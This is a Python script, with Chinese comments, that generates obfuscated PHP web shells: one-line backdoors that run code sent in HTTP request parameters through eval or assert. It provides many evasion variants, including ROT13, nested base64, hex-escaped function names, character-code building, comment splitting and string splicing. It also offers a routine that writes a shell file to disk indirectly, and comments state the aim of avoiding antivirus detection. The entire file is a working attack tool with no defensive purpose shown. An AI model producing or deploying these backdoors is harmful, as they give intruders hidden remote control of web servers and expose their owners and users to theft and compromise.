#coding=utf-8
import random
import base64

def rot13(message):
    first = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    trance = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
    return message.translate(str.maketrans(first, trance))

def php_base(pwd):
    return "<?php @eval($_POST['"+pwd+"']);?>"

def php_array_confusion1(pwd):
    return "<?php array_map('assert',(array)$_REQUEST['"+pwd+"']);?>"

def php_array_confusion2(pwd):
    return "<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['"+pwd+"']);?>"

def php_rot13(pwd):
    return "<?php eval(str_rot13('"+rot13("eval($_POST['"+pwd+"']);")+"'));?>"

#使用array混淆
def php_func_encode(pwd,chouse=0):
    if chouse!='' and int(chouse)>=1 and int(chouse)<=3:
        r=int(chouse)
    else:
        r=random.randint(1,3)
    if r==1:
        return r"<?php array_map('ass\x65rt',(array)$_REQUEST['"+pwd+"']);?>"
    elif r==2:
        return r"<?php array_map('as\x73ert',(array)$_REQUEST['"+pwd+"']);?>"
    elif r==3:
        return r"<?php array_map('a\x73s\x65rt',(array)$_REQUEST['"+pwd+"']);?>"

def php_base64_confusion(pwd):
    return "<?php $x=base64_decode('YXNzZXJ0');$x($_POST['"+pwd+"']);?>"

#多次base64混淆
def php_muti_base64(pwd,num=0):
    if num=='' or int(num)<=0:
        num=random.randint(1,5)
    else:
        num=int(num)
    t="eval($_POST['"+pwd+"'])"
    for i in range(num):
        t='eval(base64_decode('+str(base64.b64encode(bytes(t, encoding = "utf8")), encoding = "utf8")+'))'
    return '<?php '+t+';?>'

def php_word_coded(pwd):
    t=''
    for item in pwd:
        t+='.$_uU('+str(ord(item))+')'
    return '<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(39)'+t+'.$_uU(39).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>'

#注释混淆
def php_note_confusion(pwd):
    t='''<?php @$_="s"."s"./*-
 
////////////////////
 
*-*/"e"./*-/*-*/"r";@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}[/*-/
 
/////////////////////
 
*-*/'''
    for item in pwd:
        t+=item+'/*-/*-*/'
    t+=']);?>'
    return t

def php_str_splicing(pwd):
    return '''<?php
 
$__C_C="'''+str(base64.b64encode(bytes(pwd, encoding = "utf8")), encoding = "utf8")+'''";
 
$__P_P="abcdefghijklmnopqrstuvwxyz";
 
$__X_X="123456789";
 
$__O_O=$__X_X[5].$__X_X[3]."_";
 
$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];
 
$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];
 
$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];
 
$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];
 
$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];
 
$_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");');
 
@$_[00]($__H_H($__H_H($__C_C)));
 
?>'''

#免杀
def php_miansha(pwd):
    return '<!--?php $x="as"."se"."rt";$x($_POST["'+pwd+'"]);?-->'


def php_jianjiexxiema():
    '''间接写马'''
    fname=input('需写入马的文件名:')
    pwd=input('需写入马的密码:')
    codecmode=input('需写入马的编码模式:\n1.hex\n2.base64\n')
    if codecmode not in ('1','2'):
        print('请选择正确的模式')
        return ''

    def expansion(s):
        if len(s)==1:
            return '0'+s
        return s

    if codecmode=='1':
        base='<!--?php fputs (fopen(pack("H*","{fname}"),"w"),pack("H*","{pwd}"))?-->'
        pwd='<?@eval($_POST[{}])?>'.format(pwd)

        fname=''.join([expansion(hex(ord(c)).replace('0x', '')) for c in fname])
        pwd=''.join([expansion(hex(ord(c)).replace('0x', '')) for c in pwd])
        return base.format(fname=fname,pwd=pwd)

    elif codecmode=='2':
        import base64
        base="<!--?php @fputs(fopen(base64_decode('{fname}'),w),base64_decode('{pwd}'));?-->"
        pwd="<?php @eval($_POST['{}']);?>".format(pwd)

        fname=base64.b64encode(fname.encode('utf-8')).decode('utf-8')
        pwd=base64.b64encode(pwd.encode('utf-8')).decode('utf-8')
        return base.format(fname=fname,pwd=pwd)


def php_no_wenhao(pwd):
    return '''<script type="text/javascript" language="php">// <![CDATA[ 
eval ($_POST[{}]); 
// ]]></script>'''.format(pwd)

def php_guogou(pwd):
    print("//菜刀地址 http://xx/xx.php?s=assert'")
    return '<!--?php ($_=@$_GET[s]).@$_($_POST[{}])?--> '.format(pwd)


